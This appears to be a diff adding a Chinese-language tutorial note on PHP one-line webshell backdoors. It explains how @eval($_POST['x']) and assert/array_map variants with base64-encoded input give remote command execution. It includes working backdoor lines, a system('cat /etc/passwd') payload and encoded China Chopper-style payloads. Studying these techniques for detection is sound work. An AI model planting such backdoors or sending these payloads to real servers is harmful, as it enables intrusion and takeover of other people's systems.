@@ -1,0 +1,65 @@
+为什么传递一个参数名就可以查看目录文件，执行命令？
+
+
+   一句话木马  @eval($_POST['x']) 中，首先 @符号作用是 当一句话执行失败时，跳过继续往下面执行，不影响原来的代码
+
+   eval 的作用就是将字符串当做代码来执行，POST则是获取用户发送的参数，也可以是COOKIE REQUEST GET
+
+   传递一个 x 参数就可以拿shell是因为，这个参数的值可以是php函数，比如
+
+
+   [POST]: x = phpinfo();  传递上去后一句话就会变成：   @eval('phpinfo()') 所以就可以查看，读写文件了
+
+
+   为什么可以运行cmd 或者 shell  ，其实也就是利用system 函数去执行的， 比如 
+
+
+   [POST]: x = system('cat /etc/passwd');   
+
+
+   php 除了eval 可以写成一句话，还有另外两种比较常用的函数，一个是 assert  另一个是 array_map
+
+
+   
+下面是来自漏洞人生的一篇文章：
+
+
+ 				浅析一句话后门中eval与assert执行条件与原理
+
+
+eval与assert都算是元老级一句话后门函数，其实很多情形下代码的执行还是需要依靠eval去执行，只是前锋路转了而已。
+
+eval与assert函数的用法大家可以自行百度。
+eval与assert区别
+eval函数中参数是字符，如：
+
+eval('echo 1;');
+
+assert函数中参数为表达式 （或者为函数），如：
+
+ assert(phpinfo()) 
+
+assert(eval('echo 1;'));
+直接传递普通代码是无法执行的，如：assert('echo 1;');
+下面这个代码执行不了:
+@array_map("eval",array('phpinfo();'));
+肯定会错： Warning: array_map() expects parameter 1 to be a valid callback, function 'eval' not found or invalid function name，提示array_map第一个参数需要是回调函数
+所以这个后门：
+@array_map(assert,(array)base64_decode($_REQUEST['xx']));
+array_map第二个参数需要再镶嵌一个assert，
+xx=YXNzZXJ0KCRfUkVRVUVTVFsnYWEnXSk=
+base64_decode($_REQUEST['xx'])   得到：  assert($_REQUEST['aa'])
+其中aa为菜刀中post的数据
+
+ aa=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7 
+
+这样，会构造出：assert(eval('执行代码'))，这个为array_map的第二个参数，
+最终将数组中第二个参数回调到第一个数组，执行时代码为：assert(assert(eval('执行代码')) )
+另一个例子：
+$a=(array)base64_decode($_POST['a']);
+array_map(assert,$a);
+这时候需要构造post参数为：
+
+ a=ZXZhbCgnZWNobyAxOycp 
+
+（eval('echo 1;')）
